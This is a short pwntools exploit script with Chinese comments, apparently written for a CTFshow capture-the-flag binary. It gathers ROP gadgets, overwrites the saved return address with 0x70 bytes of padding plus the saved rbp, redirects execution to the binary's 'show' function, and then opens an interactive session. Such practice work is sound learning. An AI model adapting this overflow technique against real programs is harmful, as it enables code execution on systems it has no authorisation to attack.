#!/usr/bin/env python3
from pwn import *
from kk import *

context(arch='amd64', os='linux')
context.log_level = 'info'

# 加载程序
elf = ELF('./pwn')

# 本地测试
p = process('./pwn')

# 获取 gadgets
K, L = libcrop(elf)

print("=" * 60)
print("可用 gadgets:")
print("=" * 60)
print(f"pop_rdi: {hex(K['pop_rdi'])}")
print(f"pop_rsi_r15_rbp: {K.get('pop_rsi_r15_rbp')}")
print(f"pop_r12_r13_r14_r15: {K.get('pop_r12_r13_r14_r15')}")
print(f"ret: {hex(K['ret'])}")
print()

# 关键地址
pop_rdi = K['pop_rdi']
ret = K['ret']
show_addr = elf.symbols['show']

print("=" * 60)
print("简单测试 - 返回 show 函数")
print("=" * 60)

# 构造简单 payload
payload = b'A' * 0x70  # 填充缓冲区
payload += b'B' * 8     # 填充 saved rbp
payload += p64(show_addr)  # 返回 show 函数

print(f"[*] 发送 payload ({len(payload)} 字节)...")
print(f"[*] payload: {payload[:40]}...")

try:
    # 接收欢迎信息
    data = p.recvuntil(b'CTFshow PWN!\n', timeout=2)
    print(f"[+] 收到: {data}")

    # 发送 payload
    p.sendline(payload)

    # 等待响应
    time.sleep(1)

    # 检查进程状态
    if p.poll() is not None:
        print(f"[!] 进程已退出，退出码: {p.poll()}")
    else:
        print("[+] 进程仍在运行")

        # 尝试接收
        try:
            resp = p.recv(timeout=1)
            print(f"[+] 收到响应: {resp}")
        except:
            print("[*] 无响应")

except Exception as e:
    print(f"[!] 错误: {e}")

print("[*] 交互模式...")
p.interactive()
